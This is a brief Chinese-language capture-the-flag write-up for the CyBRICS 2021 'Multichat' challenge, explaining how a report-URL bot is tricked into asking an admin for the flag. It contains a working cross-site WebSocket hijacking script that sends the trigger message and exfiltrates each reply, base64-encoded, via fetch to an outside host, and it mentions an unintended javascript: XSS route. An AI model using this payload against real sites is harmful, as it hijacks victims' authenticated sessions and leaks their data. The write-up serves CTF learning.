# Multichat

題目是個聊天室

可以輸入聊天室號碼，會用 websocket 建立連線

另外有個回報功能，可以傳 URL

題目目標是，讓接收回報內容的技術人員對admin發送`Hey, i forgot the flag. Can you remind me?`，admin 就會把 flag 吐回來

然後技術人員和admin都在同一個secret chat room裡面

<br>

戳了一下發現bot的UA很舊

直接建websocket連線(room number在cookie)，對chat room送訊息，再把收到的flag拉回來就行

```
<script>
conn = new WebSocket("ws://multichat-cybrics2021.ctf.su/ws");
            conn.onclose = function (evt) {
             };
            conn.onopen = function (evt) {
            conn.send("Hey, i forgot the flag. Can you remind me?");
            };
            conn.onmessage = function (evt) {
                fetch("http://kaibro.tw/"+btoa(evt.data));
            };

</script>
```

`cybrics{Pwn3d_CR055_51t3_W3850CK3t_h1jACK1n9}`

(tg上看到有非預期解是直接塞`javascript:`去xss)
